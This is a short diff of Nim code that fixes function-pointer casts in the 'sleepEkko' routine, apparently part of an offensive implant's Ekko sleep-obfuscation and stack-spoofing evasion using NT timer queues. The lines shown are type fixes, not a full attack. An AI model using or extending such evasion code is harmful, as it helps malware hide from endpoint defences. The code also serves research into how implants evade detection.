@@ -37,7 +37,7 @@ type
     RtlDeleteTimerQueue = proc(hQueue: HANDLE): NTSTATUS {.stdcall.} 
     NtCreateEvent = proc(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.stdcall.} 
     RtlCreateTimer = proc(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.stdcall.} 
-    RtlRegisterWait = proc( hWait: PHANDLE, handle: HANDLE, function: PWAIT_CALLBACK_ROUTINE, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS {.stdcall.}  
+    RtlRegisterWait = proc( hWait: PHANDLE, handle: HANDLE, function: PVOID, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS {.stdcall.}  
     NtSignalAndWaitForSingleObject = proc(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.stdcall.} 
     NtSetEvent = proc(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.stdcall.} 
     NtDuplicateObject = proc(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.stdcall.} 
@@ -168,13 +168,13 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
 
         # Retrieve the initial thread context
         delay += 100
-        status = apis.RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
+        status = apis.RtlCreateTimer(queue, addr timer, cast[PVOID](RtlCaptureContext), addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
 
         # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
         delay += 100
-        status = apis.RtlCreateTimer(queue, addr timer, SetEvent, cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
+        status = apis.RtlCreateTimer(queue, addr timer, cast[PVOID](SetEvent), cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
         if status != STATUS_SUCCESS:
             raise newException(CatchableError, status.getNtError())
 
